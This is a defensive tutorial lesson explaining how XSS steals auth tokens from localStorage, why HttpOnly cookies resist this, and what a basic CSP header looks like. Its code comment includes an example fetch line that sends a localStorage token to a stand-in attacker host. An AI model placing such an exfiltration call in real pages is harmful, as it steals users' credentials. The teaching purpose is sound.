# 20: Token Theft via XSS

> **Goal:** Understand XSS token theft, HttpOnly cookies vs localStorage, and CSP basics.

## 1) Simple explanation (like I'm 7)

**XSS (Cross-Site Scripting)**: Bad guy sneaks malicious JavaScript onto a page. If that JS runs in your browser:
- If token is in **localStorage**, JS can read it and send to bad guy.
- If token is in **HttpOnly cookie**, JS cannot read it - browser sends it automatically but JS can't steal the value.

HttpOnly cookies are much safer against XSS token theft.

## 2) Real name (technical)

- **XSS**: Injection of malicious scripts. Stored, Reflected, DOM-based.
- **Token theft**: Exfiltrating auth tokens via XSS
- **HttpOnly cookie**: Not accessible to `document.cookie`/JS
- **localStorage**: Fully accessible to JS - vulnerable to XSS
- **CSP (Content Security Policy)**: Restrict sources of scripts/styles to reduce XSS risk
- **Defense in depth**: Sanitize input/output, CSP, HttpOnly cookies, short-lived tokens

> **OWASP XSS Prevention Cheat Sheet:** Use HttpOnly cookies for sensitive tokens, implement CSP, sanitize/escape.

## 3) Example: complete, runnable code with comments

```ts
// auth-learn/api/src/20-xss-token-theft-concept.ts
console.log("=== DANGER DEMO: XSS stealing from localStorage ===");
// If malicious JS runs:
// fetch('https://evil.example.com/steal?token=' + localStorage.getItem('token'));

console.log("=== SAFE: HttpOnly cookie ===");
// JS cannot do: document.cookie to read HttpOnly cookies
// Browser still sends them on same-site requests

console.log("CSP example header: Content-Security-Policy: default-src 'self'; script-src 'self'");
```

**Key point:** Never store auth tokens in localStorage if HttpOnly cookies possible. HttpOnly prevents JS read access.

**Reset:** `rm auth-learn/api/src/20-xss-token-theft-concept.ts`

**Next:** 21-mfa-totp-backup-codes.md
